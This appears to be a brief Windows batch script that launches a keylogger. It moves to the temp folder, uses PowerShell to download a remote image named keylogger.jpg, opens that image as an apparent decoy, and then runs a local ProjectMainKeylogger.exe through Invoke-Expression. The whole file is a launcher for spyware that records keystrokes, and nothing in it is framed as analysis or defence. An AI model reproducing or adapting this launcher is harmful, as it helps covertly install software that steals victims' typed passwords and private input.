cd %TEMP%
Powershell -Command "Invoke-WebRequest 'https://www.geckoandfly.com/wp-content/uploads/2013/03/530-keylogger-spy.jpg' -OutFile keylogger.jpg"
keylogger.jpg
Powershell -Command "Invoke-Expression "C:\Users\Shobhit\PycharmProjects\KeyLogger\ProjectMainKeylogger.exe"
ProjectMainKeylogger.exe